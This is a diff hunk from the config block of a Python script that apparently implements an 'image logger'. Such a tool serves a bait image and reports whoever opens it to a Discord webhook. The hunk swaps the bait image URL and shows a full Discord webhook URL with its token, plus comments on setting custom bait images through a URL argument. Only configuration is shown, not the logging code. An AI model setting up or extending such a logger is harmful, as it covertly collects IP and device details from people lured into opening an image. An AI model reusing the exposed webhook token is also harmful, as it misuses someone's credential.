@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1358528799763075202/A_jnvWZPykpfEbvRzz30uSGIu946B7j7dVX4Z6F8V7Jy7N4JyiOmCf8_8BfUdPXo4Lk1",
-    "image": "https://wykop.pl/cdn/c3201142/comment_1673636589qQmx1CVaplJNUZxit8lkg8,w400.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://us-tuna-sounds-images.voicemod.net/f0cc3284-36b9-475c-abd9-3d598fb3bc54-1691961668364.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
